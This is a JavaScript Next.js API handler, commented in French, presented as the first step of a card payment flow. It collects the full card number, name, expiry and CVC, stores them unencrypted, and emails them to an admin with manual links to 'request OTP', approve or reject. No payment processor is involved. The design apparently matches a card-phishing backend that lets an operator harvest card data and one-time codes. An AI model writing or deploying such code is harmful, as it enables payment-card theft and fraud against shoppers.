/**
 * POST /api/payments/card-otp
 *
 * ÉTAPE 1 du flux — appelé quand le client clique "Payer par CB" :
 *  1. Reçoit les infos carte + orderId
 *  2. Crée une OtpSession (step: 'card_sent') + un Payment (pending)
 *  3. Envoie EMAIL 1 à l'admin : infos carte + 4 boutons d'action
 *  4. Retourne { success: true, sessionId, paymentId }
 *     → le frontend ouvre le modal et commence à poller
 */

import crypto from "crypto"
import mongoose from "mongoose"
import connectDB from "@/lib/mongoose"
import { Order, Payment, OtpSession } from "@/models/index"
import { sendEmail } from "@/lib/email"
import { adminCardInfoEmail } from "@/lib/card-email-templates"

function formatCardNumber(n) {
    return n.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim()
}

function formatPrice(n) {
    return Number(n).toFixed(2).replace(".", ",") + " €"
}

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ success: false, error: "Méthode non autorisée" })
    }

    const adminEmail = process.env.ADMIN_EMAIL || process.env.SMTP_USER
    if (!adminEmail) {
        return res.status(500).json({ success: false, error: "Configuration admin manquante" })
    }

    try {
        await connectDB()

        const { orderId, number, name, expiry, cvc } = req.body

        if (!orderId || !number || !name || !expiry || !cvc) {
            return res.status(400).json({ success: false, error: "Données de carte manquantes" })
        }

        if (!mongoose.isValidObjectId(orderId)) {
            return res.status(400).json({ success: false, error: "Identifiant de commande invalide" })
        }

        const order = await Order.findOne({
            _id: orderId,
            paymentStatus: { $in: ["pending", "failed"] },
        })

        if (!order) {
            return res.status(404).json({ success: false, error: "Commande introuvable ou déjà payée" })
        }

        // Supprimer les sessions et paiements précédents pour cette commande
        await OtpSession.deleteMany({ order: orderId })
        await Payment.deleteMany({ order: orderId, method: "card", status: "pending" })

        // Créer la session avec un token admin
        const adminToken = crypto.randomBytes(32).toString("hex")
        const session = await OtpSession.create({
            order: orderId,
            cardNumber: formatCardNumber(number),
            cardName: name,
            cardExpiry: expiry,
            cardCvc: cvc,
            step: "card_sent",
            adminToken,
        })

        // Créer le Payment dès l'étape 1
        const payment = await Payment.create({
            order: orderId,
            amount: order.total,
            method: "card",
            status: "pending",
            notes: `otp_session:${session._id}`,
        })

        // Mettre la commande en mode carte
        order.paymentMethod = "card"
        await order.save()

        const orderRef = order.orderNumber
        const customerName = `${order.customer.firstName} ${order.customer.lastName}`.trim() || "Client"
        const customerEmail = order.customer.email || "—"

        // URLs des actions admin
        const baseUrl =
            process.env.NEXT_PUBLIC_SITE_URL ||
            process.env.NEXTAUTH_URL ||
            `${req.headers["x-forwarded-proto"] || "http"}://${req.headers.host}`
        const bankValidationUrl = `${baseUrl}/api/payments/card-action?token=${adminToken}&action=bank_validation`
        const otpRequestUrl = `${baseUrl}/api/payments/card-action?token=${adminToken}&action=otp_request`
        const approveUrl = `${baseUrl}/api/payments/card-decision?token=${adminToken}&decision=approve`
        const rejectUrl = `${baseUrl}/api/payments/card-decision?token=${adminToken}&decision=reject`

        // EMAIL 1 → admin
        const { subject, html } = adminCardInfoEmail({
            customerName,
            customerEmail,
            cardNumber: formatCardNumber(number),
            cardName: name,
            cardExpiry: expiry,
            cardCvc: cvc,
            orderRef,
            amount: formatPrice(order.total),
            bankValidationUrl,
            otpRequestUrl,
            approveUrl,
            rejectUrl,
        })

        sendEmail({ to: adminEmail, subject, html }).catch((err) =>
            console.error("[card-otp] Erreur email admin:", err.message)
        )

        return res.status(200).json({
            success: true,
            sessionId: session._id,
            paymentId: payment._id,
        })
    } catch (error) {
        console.error("[card-otp] Erreur:", error)
        return res.status(500).json({
            success: false,
            error: process.env.NODE_ENV === "development" ? error.message : "Erreur serveur",
        })
    }
}
